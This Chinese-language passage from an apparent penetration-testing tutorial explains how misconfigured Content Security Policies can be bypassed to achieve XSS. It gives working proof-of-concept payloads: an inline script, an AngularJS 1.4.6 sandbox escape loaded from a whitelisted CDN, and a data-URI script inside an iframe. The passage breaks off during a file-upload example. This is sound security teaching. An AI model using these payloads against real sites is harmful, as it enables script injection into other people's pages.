
# 内容安全策略（CSP）绕过

CSP 是防止 XSS 攻击的最有效方法。然而，Web 管理员为了适应 Web 应用程序的功能而无意中放宽 CSP 是很常见的，这可能导致漏洞。在本节中，我们将讨论常见的 CSP 错误配置，这些配置可能导致绕过并最终导致 XSS。

## CSP 绕过：示例 #1 unsafe-inline

在 CSP 中，`script-src` 指令用于将指定脚本源列入白名单。如果将 `script-src` 设置为 `self`，则表示仅允许加载同源的脚本。

有时，`script-src` 指令可能设置为 `unsafe-inline`；这虽然会阻止未列入白名单的第三方脚本加载，但同时允许内联脚本元素、事件处理程序和 JavaScript URL 执行。

```
Content-Security-Policy: script-src 'unsafe-inline';
```

考虑以下 XSS 有效载荷，它内联注入 JavaScript；它与此策略兼容：

**有效载荷：**
```html
<script>alert(document.domain)</script>
```

## CSP 绕过：示例 #2——第三方端点和 "unsafe-eval"

第三方 JavaScript 文件（如 jQuery、AngularJS 等）通常托管并服务于内容分发网络（CDN），如 Cloudflare、Akamai 等，以实现更快的加载时间。

在一种场景中，网站管理员已将 CDN 域列入 CSP 白名单，并且还启用了 `unsafe-eval`。测试者加载已托管在白名单 CDN 上的易受攻击的库版本，然后执行任意 JavaScript。

考虑以下策略：
```
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```

该策略已将 `cdnjs.cloudflare.com` 列入白名单，这意味着可以加载托管在此域上的任何脚本。

**示例**
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
```

在此示例中，从白名单 CDN 加载了具有已知沙盒绕过的易受攻击的 AngularJS 版本。由于 CSP 中还启用了 `unsafe-eval`，它允许使用 JavaScript 的 `eval()` 函数以及类似方法（如 `setTimeout()` 和 `setInterval()`），这些方法可以将字符串作为 JavaScript 代码执行。以下代码代表 AngularJS 版本 1.4.6 的绕过。

**示例**
```html
<div ng-app>
{{'a'.constructor.prototype.charAt=[].join; // Sandbox bypass
$eval('x=1}}};alert(document.domain);//');}}//Executes XSS Payload
</div>
```

通过将两者结合，我们得到以下有效载荷：

**有效载荷**
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app>
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1}}};alert(document.domain);//');}}
</div>
```

第一部分将加载易受攻击的 AngularJS 版本，第二部分将利用 AngularJS 1.4.6 中的已知沙盒绕过，组合它们将导致 XSS 的执行。

## CSP 绕过：示例 #3——允许 Data URI

在此场景中，CSP 配置为 `script-src 'self'`，但也允许包含 `data:`。此配置可能导致安全绕过，因为它允许使用数据 URL，这些 URL 可以嵌入实际的脚本内容。

考虑以下 CSP 设置：

**示例**
```
Content-Security-Policy: script-src 'self' data:;
```

在此配置中，由于允许使用 data URI，因此可用于直接在 iframe 中嵌入 HTML 内容，而不是从外部源加载。在 iframe 中，`srcdoc` 属性可用于促进内联文档的创建。因此，当包含我们 XSS 有效载荷的 data URI 作为内联内容的一部分时，它会在目标域的上下文中执行。

**有效载荷**
```html
<iframe srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>
```

## 4.28 CSP 绕过：示例 #4——通过 JavaScript 文件上传实现 XSS

我们知道 CSP 阻止从外部网站加载 JavaScript，为了允许内部脚本，使用了 `self` 标志。然而，如果网站存在文件上传漏洞并允许上传 `.js` 文件，则这些文件可以在 XSS 向量中被引用。结果，它们将被视为来自同源的脚本，从而可能绕过 CSP。

在最近的一次渗透测试中，我们遇到了类似的场景，一个 Web 应用程序存在任意文件上传漏洞，允许用户上传 HTML、CSS 和 JS 文件作为其个人资料图像。我们将 XSS 有效载荷嵌入到一个 HTML 文件中，并将其作为个人资料图像上传。由于存在 CSP，渲染时执行被阻止。
